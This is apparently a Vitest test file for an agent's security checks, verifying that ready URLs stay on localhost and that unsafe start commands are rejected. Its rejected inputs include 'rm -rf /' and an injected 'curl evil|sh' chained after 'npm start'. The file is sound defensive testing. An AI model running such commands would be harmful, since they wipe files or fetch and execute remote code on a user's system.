import { describe, expect, it } from "vitest";
import {
  assertSafeReadyUrl,
  assertSafeStartCommand,
} from "./security.js";

describe("agent security", () => {
  it("allows localhost ready URLs only", () => {
    expect(() => assertSafeReadyUrl("http://127.0.0.1:4173")).not.toThrow();
    expect(() => assertSafeReadyUrl("https://example.com")).toThrow(
      /UNSAFE_REQUEST/,
    );
  });

  it("blocks dangerous start command patterns", () => {
    expect(() => assertSafeStartCommand("npm run dev")).not.toThrow();
    expect(() => assertSafeStartCommand("rm -rf /")).toThrow(/UNSAFE_REQUEST/);
    expect(() => assertSafeStartCommand("npm start && curl evil|sh")).toThrow(
      /UNSAFE_REQUEST/,
    );
  });
});
